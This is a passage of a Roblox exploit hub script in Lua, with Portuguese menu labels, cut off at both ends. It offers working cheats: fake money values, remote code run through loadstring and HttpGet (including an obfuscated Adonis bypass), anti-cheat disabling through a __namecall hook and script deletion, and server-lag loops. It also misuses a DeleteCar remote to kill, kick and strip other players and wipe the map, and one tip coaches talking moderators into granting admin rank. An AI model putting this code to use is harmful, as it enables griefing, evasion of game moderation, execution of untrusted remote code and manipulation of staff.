        Character.HumanoidRootPart.Transparency = 0.9
  	end    
})
local Section = PlayersTab:AddSection({
	Name = "Metodos"
})    
    PlayersTab:AddButton({
        Name = "Puxar Dinheiro 1 (Metodo) - Notify (Quase todos os jogos)",
        Callback = function()
game.StarterGui:SetCore("SendNotification", {
    Title = "Metodo puxar dinheiro 1"; 
    Text = "1) vai na aba jogador, e dps Dex 2) dps de carregar va em players, procure por seu nome, clique e vai ate aba dinheiro, e dps "; 
    Icon = ""; 
    Duration = 20;
    Callback = bindableFunction;
    Button1 = "";  
    Button2 = "";
})
          end 
                })
    PlayersTab:AddButton({
        Name = "Puxar Dinheiro 2 (Metodo) - Notify (Quase todos os jogos)",
        Callback = function()
            game.StarterGui:SetCore("SendNotification", {
    Title = "Metodo puxar dinheiro 2"; 
    Text = "em baixo coloca o value o tanto dinheiro quiser"; 
    Icon = ""; 
    Duration = 20;
    Callback = bindableFunction;
    Button1 = "";  
    Button2 = "";
})
          end        
    })
PlayersTab:AddButton({
	Name = "Puxar Dinheiro 3 Possui Bypass",
	Callback = function()
      		local Player = game.Players.LocalPlayer
local Dinheiro = Player.leaderstats.Dinheiro

Dinheiro.Value = 99999999
  	end   
})
PlayersTab:AddButton({
	Name = "Puxar Dinheiro (300K)",
	Callback = function()
      		local Player = game.Players.LocalPlayer
local Dinheiro = Player.leaderstats.Dinheiro

Dinheiro.Value = 300000
  	end   
    })
PlayersTab:AddButton({
	Name = "Puxar Dinheiro TGI (!)",
	Callback = function()
      		local Player = game.Players.LocalPlayer
local Dinheiro = Player.leaderstats.Dinheiro

Dinheiro.Value = 99999999
  	end    
})
PlayersTab:AddButton({
	Name = "Puxar Dinheiro Vida No Para",
	Callback = function()
      		local Player = game.Players.LocalPlayer
local Dinheiro = Player.leaderstats.Dinheiro

Dinheiro.Value = 99999999
  	end    
})
local Section = MenusTab:AddSection({
	Name = "Melhores"
})
    MenusTab:AddButton({
        Name = "Infinite yield",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
          end         
    })
    MenusTab:AddButton({
        Name = "Pedroxz Menu V1",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Pedroxz63/PedroMenu/main/README.md'))()
          end       
    })
    MenusTab:AddButton({
        Name = "Kakah Menu Key: 2182396C970TKL3",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Pedroxz63/KakahMenuBypedroxz631/main/README.md'))()
          end     
    })
    MenusTab:AddButton({
        Name = "Pedroxz Hub Troll",
        Callback = function()
            loadstring(game:HttpGet"https://raw.githubusercontent.com/Pedroxz63/HubTrollPedroxz63/main/README.md")()
          end  
    })
    MenusTab:AddButton({
        Name = "Nebula ACS ",
        Callback = function()
            local NebulaNosh_Version = "NebulaLoader.lua"

loadstring(game:HttpGet("https://raw.githubusercontent.com/rphzz/Nebula/main/" ..NebulaNosh_Version))()
          end  
    })
    MenusTab:AddButton({
        Name = "Menu Privado v1",
        Callback = function()
              ----Menu privado

    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/pedroxzytbhypee/SourcePedrox8/main/README.md')))()
    
    --Config do Script
    local Window = OrionLib:MakeWindow({Name = "Menu Privado", HidePremium = false, SaveConfig = true, IntroEnabled = false})
    local Player = game.Players.LocalPlayer

    local opTab = Window:MakeTab({ 
        Name = "Players",
        Icon = "rbxassetid://7733965118",
        PremiumOnly = false      
    })
    local Section = opTab:AddSection({ 
        Name = "Opções Privada"
    })
    opTab:AddButton({
        Name = "Tool Equiper",
        Callback = function()
            local ScreenGui = Instance.new("ScreenGui")
            local Frame = Instance.new("Frame")
            local ScrollingFrame = Instance.new("ScrollingFrame")
            local UIListLayout = Instance.new("UIListLayout")
            local TextButton = Instance.new("TextButton")
            local TextLabel = Instance.new("TextLabel")
            local TextButton_2 = Instance.new("TextButton")
            
            ScreenGui.Parent = game:GetService("CoreGui")
            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            ScreenGui.ResetOnSpawn = false
            
            Frame.Parent = ScreenGui
            Frame.Active = true
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Frame.Position = UDim2.new(0.0610425249, 0, 0.0939490423, 0)
            Frame.Size = UDim2.new(0, 218, 0, 225)
            
            ScrollingFrame.Parent = Frame
            ScrollingFrame.Active = true
            ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ScrollingFrame.Position = UDim2.new(0.0871559605, 0, 0.155555561, 0)
            ScrollingFrame.Size = UDim2.new(0, 187, 0, 136)
            ScrollingFrame.CanvasSize = UDim2.new(0, 0, 35, 0)
            
            UIListLayout.Parent = ScrollingFrame
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
            
            TextButton.Parent = ScrollingFrame
            TextButton.BackgroundColor3 = Color3.fromRGB(117, 117, 117)
            TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
            TextButton.Size = UDim2.new(0, 155, 0, 39)
            TextButton.Visible = false
            TextButton.Font = Enum.Font.SourceSans
            TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextButton.TextSize = 20.000
            TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
            TextButton.TextStrokeTransparency = 0.000
            TextButton.TextWrapped = true
            
            TextLabel.Parent = Frame
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.Position = UDim2.new(-0.00129664713, 0, -0.000140406293, 0)
            TextLabel.Size = UDim2.new(0, 218, 0, 25)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "Tool Equipper"
            TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.TextSize = 14.000
            
            TextButton_2.Parent = Frame
            TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 255, 30)
            TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            TextButton_2.Position = UDim2.new(0.0825688094, 0, 0.804444432, 0)
            TextButton_2.Size = UDim2.new(0, 180, 0, 30)
            TextButton_2.Font = Enum.Font.SourceSans
            TextButton_2.Text = "update list"
            TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextButton_2.TextSize = 14.000
            
            local function FNDR_fake_script() -- Frame.LocalScript 
                local script = Instance.new('LocalScript', Frame)
            
                local button = script.Parent.ScrollingFrame.TextButton
                button.Parent = nil
                button.Name = "slaves"
                local function updatelist()
                    for i, v in script.Parent.ScrollingFrame:GetDescendants() do
                        if v:IsA("TextButton") then
                            v:Destroy()
                        end
                    end
                
                    local function cloneToChar(toolName)
                        local clonedTool = toolName:Clone()
                        clonedTool.Parent = game:GetService("Players").LocalPlayer.Character
                    end
                    for i, v in pairs(game:GetDescendants()) do
                        if v:IsA("Tool") and v.Parent.Parent ~= game:GetService("Players").LocalPlayer then
                            local clonebutton = button:Clone()
                            clonebutton.Parent = script.Parent.ScrollingFrame
                            clonebutton.Visible = true
                            clonebutton.Text = v.Name
                            clonebutton.MouseButton1Click:Connect(function()
                                cloneToChar(v)
                            end)
                        end
                    end
                end
                script.Parent.TextButton.MouseButton1Click:Connect(updatelist)
            end
            coroutine.wrap(FNDR_fake_script)()
            local function SGRWUDK_fake_script() -- Frame.DragScript 
                local script = Instance.new('LocalScript', Frame)
            
                local UIS = game:GetService('UserInputService')
                local frame = script.Parent
                local dragToggle = nil
                local dragSpeed = 0
                local dragStart = nil
                local startPos = nil
                
                local function updateInput(input)
                    local delta = input.Position - dragStart
                    local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                        startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {
                        Position = position
                    }):Play()
                end
                
                frame.InputBegan:Connect(function(input)
                    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
                        dragToggle = true
                        dragStart = input.Position
                        startPos = frame.Position
                        input.Changed:Connect(function()
                            if input.UserInputState == Enum.UserInputState.End then
                                dragToggle = false
                            end
                        end)
                    end
                end)
                
                UIS.InputChanged:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                        if dragToggle then
                            updateInput(input)
                        end
                    end
                end)
                
            end
            coroutine.wrap(SGRWUDK_fake_script)()   
          end      
    })
    opTab:AddButton({
        Name = "Leak Mapa",
        Callback = function()
            saveinstance()
          end      
    })
    local cdaTab = Window:MakeTab({ 
        Name = "Cidade Alta",
        Icon = "rbxassetid://7733965118",
        PremiumOnly = false      
    })
    local Section = cdaTab:AddSection({ 
        Name = "Cidade alta"
    })
    cdaTab:AddButton({
        Name = "Bypass Anti-Cheat",
        Callback = function()
            for _, objeto in ipairs(game.Players.LocalPlayer.PlayerScripts:GetChildren()) do
                objeto:Destroy()
                print("bypassed anticheat")
                end
          end      
    })
local Section = cdaTab:AddSection({ 
    Name = "Lag Server Cda"
    })
    cdaTab:AddButton({
        Name = "Lag Server V1",
        Callback = function()
            while task.wait() do

                for _, player in next, game.Players:GetPlayers() do
                   game:GetService("ReplicatedStorage")["ACS_Engine"].Events.SuppressionEvent:FireServer(player, 666, 666, 666)
                end
              end
          end      
    })
    cdaTab:AddButton({
        Name = "Supression Server",
        Callback = function()
            while task.wait() do

                for _, player in next, game.Players:GetPlayers() do
                   game:GetService("ReplicatedStorage")["ACS_Engine"].Events.SuppressionEvent:FireServer(player, 666, 666, 666)
                end
              end
          end      
    })
local Section = cdaTab:AddSection({ 
    Name = "Loja (comprar armas)"
    })
    cdaTab:AddButton({
        Name = "Abrir Loja",
        Callback = function()
            game.Players.LocalPlayer.PlayerGui["Loja de Armas"].Enabled = true
          end      
    })
    cdaTab:AddButton({
        Name = "Fechar Loja",
        Callback = function()
            game.Players.LocalPlayer.PlayerGui["Loja de Armas"].Enabled = false
          end      
    })
		end
    })
    local Section = MenusTab:AddSection({
        Name = "Full Troll"
    })
    MenusTab:AddButton({
        Name = "Hub Troll (Ebs)",
        Callback = function()
            --Instances
local plr = game.Players.LocalPlayer
local Troll = Instance.new("ScreenGui")
local UiCorner1 = Instance.new("UICorner")
local UiCorner2 = Instance.new("UICorner")
local UiCorner3 = Instance.new("UICorner")
local UiCorner4 = Instance.new("UICorner")
local UiCorner6 = Instance.new("UICorner")
local UiCorner8 = Instance.new("UICorner")
local UiCorner7 = Instance.new("UICorner")
local UiCorner10 = Instance.new("UICorner")
local UiCorner2222 = Instance.new("UICorner")
local UiCorner15 = Instance.new("UICorner")
local UiCorner5 = Instance.new("UICorner")
local UiGradient = Instance.new("UIGradient")
local UiGradient2 = Instance.new("UIGradient")
local UiGradient15 = Instance.new("UIGradient")
local TextBox = Instance.new("TextBox")
local TextBox2 = Instance.new("TextBox")
local frame = Instance.new("Frame")
local frame2 = Instance.new("Frame")
local UiCorner9 = Instance.new("UICorner")
local UiCorner14 = Instance.new("UICorner")
local UiCorner11 = Instance.new("UICorner")
local UiCorner16 = Instance.new("UICorner")
local UiCorner13 = Instance.new("UICorner")
local UiCorner12 = Instance.new("UICorner")
local UiCorner15 = Instance.new("UICorner")
local UiCorner17 = Instance.new("UICorner")
local UiCorner18 = Instance.new("UICorner")
local button1 = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local Close2 = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local TextButton2 = Instance.new("TextButton")
local button2 = Instance.new("TextButton")
local button10 = Instance.new("TextButton")
local button8 = Instance.new("TextButton")
local button3 = Instance.new("TextButton")
local button4 = Instance.new("TextButton")
local button5 = Instance.new("TextButton")
local button6 = Instance.new("TextButton")
local button7 = Instance.new("TextButton")
local button9 = Instance.new("TextButton")
local button11 = Instance.new("TextButton")
local Titulo = Instance.new("TextLabel")
local Titulo2 = Instance.new("TextLabel")

-- Parte do ScreenGui
Troll.Parent = plr.PlayerGui
Troll.Name = "Trollador"
Troll.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Troll.ResetOnSpawn = false

--Frame

frame.Parent = Troll
frame.Name = "Frame1"
UiGradient.Parent = frame
UiGradient.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(0.239216, 0.239216, 0.239216))
frame.Active = true
UiCorner1.Parent = frame
frame.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
frame.Draggable = true
frame.Position = UDim2.new(0.5, -150, 0.5, -67)
frame.Size = UDim2.new(0, 300,0, 300)

-- Titulo

Titulo.Parent = frame
Titulo.Position = UDim2.new(0.164, 0,0.029, 0)
Titulo.BackgroundTransparency = 1
Titulo.Size = UDim2.new(0, 200,0, 50)
Titulo.Text = "Pedroxz Troll"
Titulo.TextScaled = true
Titulo.Font = Enum.Font.FredokaOne
Titulo.TextColor3 = Color3.new(1, 1, 1)

-- Titulo2

Titulo2.Parent = frame2
Titulo2.Position = UDim2.new(0.164, 0,0.029, 0)
Titulo2.BackgroundTransparency = 1
Titulo2.Size = UDim2.new(0, 200,0, 50)
Titulo2.Text = "Menu"
Titulo2.TextScaled = true
Titulo2.Font = Enum.Font.FredokaOne
Titulo2.TextColor3 = Color3.new(1, 1, 1)

-- Importante 

local Importante = Instance.new("TextLabel")
Importante.Parent = frame
Importante.Position = UDim2.new(0.001, 0,0.993, 3)
Importante.BackgroundTransparency = 1
Importante.Size = UDim2.new(0, 300,0, 30)
Importante.Text = "Troll Pedroxz"
Importante.TextScaled = true
Importante.Font = Enum.Font.FredokaOne
Importante.TextColor3 = Color3.new(0.215686, 1, 0)

-- Importante 2

local Importante2 = Instance.new("TextLabel")
Importante2.Parent = frame2
Importante2.Position = UDim2.new(0.001, 0,0.993, 3)
Importante2.BackgroundTransparency = 1
Importante2.Size = UDim2.new(0, 300,0, 30)
Importante2.Text = "Troll Pedroxz"
Importante2.TextScaled = true
Importante2.Font = Enum.Font.FredokaOne
Importante2.TextColor3 = Color3.new(0.215686, 1, 0)


-- Close
Close.Parent = frame
Close.Position = UDim2.new(1.463, -150,0.01, -20)
	Close.Size = UDim2.new(0, 30,0, 30)
UiCorner8.Parent = Close
	Close.BorderSizePixel = 0
	Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
	Close.TextColor3 = Color3.new(1, 0, 0)
	Close.Text = "X"
	Close.Font = Enum.Font.FredokaOne
Close.TextScaled = true


Close.MouseButton1Click:Connect(function()
	plr.PlayerGui:FindFirstChild("Trollador"):Destroy()
end)

-- Botao1
button1.Parent = frame
button1.Position = UDim2.new(0.547, -150,0.497, -80)
button1.Size = UDim2.new(0, 100,0, 50)
UiCorner2.Parent = button1
button1.BorderSizePixel = 0
button1.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button1.TextColor3 = Color3.new(1, 1, 1)
button1.Text = "Matar Jogadores"
button1.Font = Enum.Font.FredokaOne
button1.TextScaled = true

-- Botao2

button2.Parent = frame
button2.Position = UDim2.new(1.12, -150,0.497, -80)
button2.Size = UDim2.new(0, 100,0, 50)
UiCorner3.Parent = button2
button2.BorderSizePixel = 0
button2.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button2.TextColor3 = Color3.new(1, 1, 1)
button2.Text = "Deixar geral peladinho"
button2.Font = Enum.Font.FredokaOne
button2.TextScaled = true

-- Botao3

button3.Parent = frame
button3.Position = UDim2.new(1.12, -150,0.497, -5)
button3.Size = UDim2.new(0, 100,0, 50)
UiCorner4.Parent = button3
button3.BorderSizePixel = 0
button3.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button3.TextColor3 = Color3.new(1, 1, 1)
button3.Text = "Geral Cotoco"
button3.Font = Enum.Font.FredokaOne
button3.TextScaled = true

-- Botao4

button4.Parent = frame
button4.Position = UDim2.new(0.547, -150,0.497, -5)
button4.Size = UDim2.new(0, 100,0, 50)
UiCorner5.Parent = button4
button4.BorderSizePixel = 0
button4.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button4.TextColor3 = Color3.new(1, 0, 0)
button4.Text = "DESTRUIR O JOGO"
button4.Font = Enum.Font.FredokaOne
button4.TextScaled = true

-- Proximo

button5.Parent = frame
button5.Name = "Proximo"
button5.Position = UDim2.new(1.59, -150,0.497, -20)
button5.Size = UDim2.new(0, 50,0, 50)
UiCorner10.Parent = button5
button5.BorderSizePixel = 0
button5.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
button5.TextColor3 = Color3.new(1, 0.294118, 0.964706)
button5.Text = ">"
button5.Font = Enum.Font.FredokaOne
button5.TextScaled = true



-- TextBox

TextBox.Parent = frame
UiCorner6.Parent = TextBox
TextBox.Position = UDim2.new(0.047, 0,0.747, 0)
TextBox.Size = UDim2.new(0, 200,0, 50)
TextBox.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
TextBox.TextColor3 = Color3.new(0.117647, 0.988235, 1)
TextBox.PlaceholderColor3 = Color3.new(1, 1, 1)
TextBox.Font = Enum.Font.FredokaOne
TextBox.Text = ""
TextBox.TextScaled = true
TextBox.PlaceholderText = "Matar Player"


-- TextButton

	TextButton.Parent = frame
	TextButton.Position = UDim2.new(1.297, -150,0.81, -20)
	TextButton.Size = UDim2.new(0, 50,0, 50)
	UiCorner7.Parent = TextButton
	TextButton.BorderSizePixel = 0
	TextButton.BackgroundColor3 = Color3.new(0.184314, 0.184314, 0.184314)
	TextButton.TextColor3 = Color3.new(0.207843, 1, 0.882353)
	TextButton.Text = ">"
	TextButton.Font = Enum.Font.FredokaOne
	TextButton.TextScaled = true

-----------------------------------------------------------------------------------------------------------------

-- Frame2

frame2.Parent = Troll
frame2.Name = "Frame2"
frame2.Visible = false
UiGradient2.Parent = frame2
UiGradient2.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.new(0.239216, 0.239216, 0.239216))
frame2.Active = true
UiCorner12.Parent = frame2
frame2.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
frame2.Draggable = true
frame2.Position = UDim2.new(0.5, -150, 0.5, -67)
frame2.Size = UDim2.new(0, 300,0, 300)


-- Botao6

button6.Parent = frame2
button6.Position = UDim2.new(0.547, -150,0.497, -80)
button6.Size = UDim2.new(0, 100,0, 50)
UiCorner11.Parent = button6
button6.BorderSizePixel = 0
button6.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button6.TextColor3 = Color3.new(1, 1, 1)
button6.Text = "ANTI-ADM"
button6.Font = Enum.Font.FredokaOne
button6.TextScaled = true


-- Voltar

button7.Parent = frame2
button7.Name = "Voltar"
button7.Position = UDim2.new(0.243, -150,0.48, -20)
button7.Size = UDim2.new(0, 50,0, 50)
UiCorner13.Parent = button7
button7.BorderSizePixel = 0
button7.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
button7.TextColor3 = Color3.new(1, 0.294118, 0.964706)
button7.Text = "<"
button7.Font = Enum.Font.FredokaOne
button7.TextScaled = true

-- Close2
Close2.Parent = frame2
Close2.Position = UDim2.new(1.463, -150,0.01, -20)
Close2.Size = UDim2.new(0, 30,0, 30)
UiCorner2222.Parent = Close2
Close2.BorderSizePixel = 0
Close2.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Close2.TextColor3 = Color3.new(1, 0, 0)
Close2.Text = "X"
Close2.Font = Enum.Font.FredokaOne
Close2.TextScaled = true

Close2.MouseButton1Click:Connect(function()
	plr.PlayerGui:FindFirstChild("Trollador"):Destroy()
end)

-- Botao8
button8.Parent = frame2
button8.Position = UDim2.new(1.12, -150,0.497, -80)
button8.Size = UDim2.new(0, 100,0, 50)
UiCorner14.Parent = button8
button8.BorderSizePixel = 0
button8.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button8.TextColor3 = Color3.new(1, 1, 1)
button8.Text = "Deletar o Workspace"
button8.Font = Enum.Font.FredokaOne
button8.TextScaled = true

-- Botao9

button9.Parent = frame2
button9.Position = UDim2.new(0.547, -150,0.497, -5)
button9.Size = UDim2.new(0, 100,0, 50)
UiCorner15.Parent = button9
button9.BorderSizePixel = 0
button9.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button9.TextColor3 = Color3.new(1, 1, 1)
button9.Text = "Clique e Destrua"
button9.Font = Enum.Font.FredokaOne
button9.TextScaled = true

--

button10.Parent = frame2
button10.Position = UDim2.new(1.12, -150,0.497, -5)
button10.Size = UDim2.new(0, 100,0, 50)
UiCorner16.Parent = button10
button10.BorderSizePixel = 0
button10.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
button10.TextColor3 = Color3.new(1, 1, 1)
button10.Text = "Deletar Carros"
button10.Font = Enum.Font.FredokaOne
button10.TextScaled = true

--

-- TextBox2

TextBox2.Parent = frame2
UiCorner18.Parent = TextBox2
TextBox2.Position = UDim2.new(0.047, 0,0.747, 0)
TextBox2.Size = UDim2.new(0, 200,0, 50)
TextBox2.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
TextBox2.TextColor3 = Color3.new(0.117647, 0.988235, 1)
TextBox2.PlaceholderColor3 = Color3.new(1, 1, 1)
TextBox2.Font = Enum.Font.FredokaOne
TextBox2.Text = ""
TextBox2.TextScaled = true
TextBox2.PlaceholderText = "Kickar Jogador"


-- TextButton2

TextButton2.Parent = frame2
TextButton2.Position = UDim2.new(1.297, -150,0.81, -20)
TextButton2.Size = UDim2.new(0, 50,0, 50)
UiCorner17.Parent = TextButton2
TextButton2.BorderSizePixel = 0
TextButton2.BackgroundColor3 = Color3.new(0.184314, 0.184314, 0.184314)
TextButton2.TextColor3 = Color3.new(0.207843, 1, 0.882353)
TextButton2.Text = ">"
TextButton2.Font = Enum.Font.FredokaOne
TextButton2.TextScaled = true



------------------------------------------------------------------------------------------------------------------

button5.MouseButton1Click:Connect(function()
	plr.PlayerGui.Trollador.Frame1.Visible = false
	plr.PlayerGui.Trollador.Frame2.Visible = true
	frame2.Position = frame.Position

end)

button7.MouseButton1Click:Connect(function()
	plr.PlayerGui.Trollador.Frame2.Visible = false
	plr.PlayerGui.Trollador.Frame1.Visible = true
	frame.Position = frame2.Position
end)


button1.MouseButton1Click:Connect(function()
	
	for i,v in pairs(game.Players:GetChildren()) do
		print(v)
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Head"))
		end
end)

button2.MouseButton1Click:Connect(function()
	
	for i,v in pairs(game.Players:GetChildren()) do
		print(v)
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Shirt"))
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Pants"))
	end
end)

button4.MouseButton1Click:Connect(function()

	for i,v in pairs(game.Players:GetChildren()) do
		print(v)
		game.ReplicatedStorage.DeleteCar:FireServer(v)
		
	end
end)



button3.MouseButton1Click:Connect(function()

	for i,v in pairs(game.Players:GetChildren()) do
		print(v)
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Right Leg"))
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Right Arm"))
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Left Arm"))
		game.ReplicatedStorage.DeleteCar:FireServer(v.Character:FindFirstChild("Left Leg"))
	end
end)

TextButton.MouseButton1Click:Connect(function()
	
	game.ReplicatedStorage.DeleteCar:FireServer(game.Players[TextBox.Text].Character:FindFirstChild("Head"))
	
end)

button6.MouseButton1Click:Connect(function()
	
	for _,plr in pairs(game.Players:GetChildren()) do
		
		if plr ~= game.Players.LocalPlayer then
		if plr.PlayerGui:FindFirstChild("Chat") then
			game.ReplicatedStorage.DeleteCar:FireServer(plr.PlayerGui)
			end
		end
		
		
	end
	
end)


button8.MouseButton1Click:Connect(function()
	for i,v in pairs(game.Workspace:GetChildren()) do
		game.ReplicatedStorage.DeleteCar:FireServer(v)
	end
end)

local OnClick = false
local mouse = plr:GetMouse()

button9.MouseButton1Click:Connect(function()
	if not OnClick then
		OnClick = true
		print("Ativado")
	else
		OnClick = false
		print("Desativado")
	end
end)

mouse.Button1Down:Connect(function()
if OnClick then
		local Target = mouse.Target
	if Target.Parent:IsA("Model") then
			game.ReplicatedStorage.DeleteCar:FireServer(Target.Parent)
	else
			game.ReplicatedStorage.DeleteCar:FireServer(Target)
		end
	end
	
end)

button10.MouseButton1Click:Connect(function()
	for i,v in pairs(game.Workspace:GetChildren()) do
		if v:FindFirstChild("DriveSeat") then
			game.ReplicatedStorage.DeleteCar:FireServer(v)
		end
	end
end)

TextButton2.MouseButton1Click:Connect(function()
	game.ReplicatedStorage.DeleteCar:FireServer(game.Players:FindFirstChild(TextBox2.Text))
end)
          end    
    })
    AdmTab:AddButton({
        Name = "Virar Adminstrador (Metodo)",
        Callback = function()
            wait(0.2)
game.StarterGui:SetCore("SendNotification", {
Title = "Como puxar adonis?"; 
Text = "Peca a algum admin que nao seja mod, fala que perdeu a patente e admin ou outra coisa, que ai ele vai dar";
Duration = 5; 
})
          end    
    })
local Section = AdmTab:AddSection({
	Name = "Outros"
})
    AdmTab:AddButton({
        Name = "Logs Staff (!)",
        Callback = function()
            loadstring(game:HttpGet("https://pastebin.com/raw/stggPUBM", true))()
          end       
        })
AdmTab:AddButton({
	Name = "Cmd Admin + Op",
	Callback = function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
  	end    
})
local Section = BypassTab:AddSection({
	Name = "Painel Anti detecter - Nem faz tanto Milagre Avisando"
})
    BypassTab:AddButton({
        Name = "Bypass V1",
            Callback = function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/Ante-kick-V1/main/README.md'),true))()
              end                        
})
    BypassTab:AddButton({
        Name = "Bypass V2",
            Callback = function()
                ait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,304,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Afk Kick Script"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,304,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,304,0,21)_b.Font=Enum.Font.Arial;_b.Text="Made by Warn"
_b.TextColor3=Color3.new(1,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377379,0)
ab.Size=UDim2.new(0,304,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Script Started"
ab.TextColor3=Color3.new(1,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="You went idle and ROBLOX tried to kick you but we reflected it!"wait(2)ab.Text="Script Re-Enabled"end)
              end    
    })
    local Section = ArmaTab:AddSection({
        Name = "Aimbot Hub"
    })   
local Section = BypassTab:AddSection({
	Name = "Desative"
})  
BypassTab:AddButton({
	Name = "Bypass Adonis (Funcional)",
	Callback = function()
		local notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/notiflib/main/main"))()
		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro2/main/ui2"))()
		local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
		 NotifyLib.prompt('Adonis Anti-Cheat Disabler Bypass', 'bypassed', 1.2)
		 NotifyLib.prompt('Adonis Anti-Cheat Disabler Bypass', 'this only works for games that have adonis in it', 1.2)
		
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RelkzzRebranded/Bypassed---OBFUSCATED..../main/Adonis%20BYPASS.lua"))()
  	end   
})
BypassTab:AddButton({
	Name = "Bypass - Eb Do Tevez",
	Callback = function()
        local player = game.Players.LocalPlayer

local function destroyLocalScripts(player)
    local character = player.Character
    if character then
        local descendants = character:GetDescendants()
        for i, v in ipairs(descendants) do
            if v:IsA("LocalScript") and v.Name:match("{") then
                v:Destroy()
            end
        end
    end
end
destroyLocalScripts(player)

game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
destroyLocalScripts(player)
end)
	end
})
BypassTab:AddButton({
	Name = "Desativar anti cheater/exploit V3",
	Callback = function()
        assert(getrawmetatable)
        grm = getrawmetatable(game)
        setreadonly(grm, false)
        old = grm.__namecall
        grm.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if tostring(args[1]) == "TeleportDetect" then
                return
            elseif tostring(args[1]) == "CHECKER_1" then
                return
            elseif tostring(args[1]) == "CHECKER" then
                return
            elseif tostring(args[1]) == "GUI_CHECK" then
                return
            elseif tostring(args[1]) == "OneMoreTime" then
                return
            elseif tostring(args[1]) == "checkingSPEED" then
                return
            elseif tostring(args[1]) == "BANREMOTE" then
                return
            elseif tostring(args[1]) == "PERMAIDBAN" then
                return
            elseif tostring(args[1]) == "KICKREMOTE" then
